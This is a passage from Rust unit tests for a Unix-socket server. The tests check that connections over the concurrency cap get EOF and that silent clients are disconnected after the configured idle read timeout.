        // healthy run EOF arrives within a few ms of connect.
        over.set_read_timeout(Some(Duration::from_secs(2)))
            .expect("set timeout");
        match over.read(&mut buf) {
            Ok(0) => {} // EOF — what we want
            Ok(n) => panic!("expected EOF, got {n} bytes (cap was bypassed?)"),
            Err(e) => panic!(
                "expected EOF, got read error {e} (cap was bypassed, server held connection idle?)"
            ),
        }
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn idle_read_timeout_disconnects_silent_client() {
        // Spawn with a short read timeout (200ms) and a normal cap.
        // Open a connection but never send any bytes; the daemon
        // hits its read_timeout, closes the stream, releases the
        // slot. Verify by reading from the client side — kernel
        // surfaces the server's close as EOF (n=0).
        let cfg = crate::config::ServerConfig {
            max_concurrent_connections: 64,
            // Smallest non-zero value (0 disables; whole-second
            // precision per set_read_timeout's contract).
            idle_read_timeout_secs: 1,
        };
        let (socket, _h) = spawn_server_with_cfg(cfg);
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let mut buf = [0u8; 16];
        // Read up to 3x the configured timeout — gives the
        // server room to fire its timeout and close the
        // connection even on slow CI runners. If the timeout
        // works, server's read returns Err, server drops the
        // stream, kernel surfaces close as Ok(0) to the client.
        // Pattern-match explicitly so a regression where the
        // server keeps the connection alive surfaces as
        // Err(WouldBlock) from the CLIENT side, not as a
        // false n=0 pass.
        stream
            .set_read_timeout(Some(Duration::from_millis(3000)))
            .expect("set timeout");
        match stream.read(&mut buf) {
            Ok(0) => {} // server closed — what we want
            Ok(n) => panic!("expected EOF, got {n} bytes"),
            Err(e) => panic!(
                "expected EOF after server timeout, got {e} (timeout not enforced?)"
            ),
        }
        let _ = std::fs::remove_file(socket);
    }
}
